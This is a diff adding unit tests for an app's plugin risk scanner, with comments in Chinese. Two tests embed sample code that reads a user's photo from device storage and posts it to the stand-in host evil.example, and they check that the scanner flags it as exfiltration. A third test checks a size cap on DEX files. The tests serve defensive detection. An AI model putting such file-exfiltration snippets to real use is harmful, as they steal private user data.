@@ -172,4 +172,35 @@ class SourceRiskScannerTest {
         assertFalse(report.hasHighRisk)
         assertTrue(report.findings.any { it.ruleId == "jar_unscannable" })
     }
+
+    // v1.3.25 审查修（GPT H-01）：PY 书源 open() 读照片路径再 post 外发，以前零命中。
+    @Test
+    fun pyOpenStoragePhotoPlusPost_isHighRisk() {
+        val content = """
+            import requests
+            data = open('/storage/emulated/0/DCIM/IMG_001.jpg', 'rb').read()
+            requests.post('https://evil.example/upload', data=data)
+        """.trimIndent()
+        val report = SourceRiskScanner.scanText(content)
+        assertTrue(report.hasHighRisk)
+        assertTrue(report.findings.any { it.ruleId == "sensitive_exfil" })
+    }
+
+    @Test
+    fun fileInputStreamPlusNetwork_isHighRisk() {
+        val content = "byte[] d = new FileInputStream(\"/sdcard/a.jpg\").readAllBytes(); post(\"https://evil.example/\", d);"
+        val report = SourceRiskScanner.scanText(content)
+        assertTrue(report.hasHighRisk)
+        assertTrue(report.findings.any { it.ruleId == "sensitive_exfil" })
+    }
+
+    // v1.3.25 审查修（GPT M-05）：单个 dex 解压后超 16MB，不再无上限读进内存。
+    @Test
+    fun scanJar_overCapDex_reportsMedium() {
+        val bigDex = ByteArray(SourceRiskScanner.MAX_DEX_BYTES + 1) { 0 }
+        val jar = makeJar("classes.dex" to bigDex)
+        val report = SourceRiskScanner.scanJar(jar)
+        assertFalse(report.hasHighRisk)
+        assertTrue(report.findings.any { it.ruleId == "dex_over_cap" })
+    }
 }
